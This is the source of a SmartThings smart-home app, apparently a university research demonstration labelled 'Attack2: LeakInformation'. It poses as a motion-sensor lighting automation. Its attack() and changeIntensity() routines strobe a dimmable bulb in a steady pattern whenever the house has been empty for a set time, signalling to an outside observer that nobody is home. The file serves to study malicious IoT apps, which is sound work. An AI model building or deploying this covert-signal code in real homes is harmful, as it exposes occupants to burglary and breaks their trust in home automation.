/**
 * Attack Description: 
 * 		The attacker could take advantage of insecure pair to leak sensitive information
 * 		via the means like side channel.
 * 
 * Normal functions:
 * 		When the motionsensor does not detect the motion for 5 minutes , then it would tell
 * 		the light that there is nobody home and let the light turn off. If there is a motion
 * 		detected, the light would be turned on.
 * 
 * Malicious functions:
 * 		The malicious light bulb would try to strobe the light when there is nobody home to 
 * 		tell the attacker that there is nobody home. The pattern of the strobing light needs
 * 		to let the attacker see the light strobing whenever he comes to the user’s home. So 
 * 		the strobing need to be consistent. We designed that when there is nobody home, the 
 * 		light would reduce lightlevel every 10 seconds. When the intensity of light gets to 20, 
 * 		it begins to add lightlevel per 10 sec. When user gets(the motionsensor detects the motion), 
 * 		the light stops strobing.
 */

definition(
		name: "Attack2: LeakInformation",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Leaking information.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Title") {
		input "themotion", "capability.motionSensor", title: "Where?"
		input "minutes", "number", required: true, title: "Minutes?"
		input "myswitch", "capability.switchLevel", title:"switchlevel?", multiple: true
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(themotion, "motion.active", motionDetectedHandler)
	subscribe(themotion, "motion.inactive", motionStoppedHandler)
}

def motionDetectedHandler(evt) {
	state.motionDetected = true
	myswitch.setLevel(80)
}

def motionStoppedHandler(evt) {
	runIn(60 * minutes, checkMotion)
}

def checkMotion() {
	log.debug "In checkMotion scheduled method"
	def motionState = themotion.currentState("motion")
	if (motionState.value == "inactive") {
		def elapsed = now() - motionState.date.time
		def threshold = 1000 * 60 * (minutes-0.1)
		if (elapsed >= threshold) {
			myswitch.setLevel(0)
			state.motionDetected = false
			attack()
		}
	}
}


def attack() {
	log.debug "attack"
	runIn(60*0.1,changeIntensity,[overwrite: false])
}


def changeIntensity() {
	def value = myswitch.currentState("level").value.first().toInteger()
	if(state.motionDetected==true) {
		myswitch.setLevel(80)
		log.debug "stop attack."
	}else{
		if(value<=20) {
			state.add=true
			myswitch.setLevel(value+20)
			log.debug "$value+20"
		}
		if(value>20&&value<80&& state.add) {
			myswitch.setLevel(value+20)
			log.debug "$value+20"
		}
		if(value>=80) {
			state.add = false;
			myswitch.setLevel(value-20)
			log.debug "$value-20"
		}
		if(value>20&value<80&&!state.add) {
			myswitch.setLevel(value-20)
			log.debug "$value-20"
		}
		runIn(60*0.1,changeIntensity,[overwrite: false])
	}
}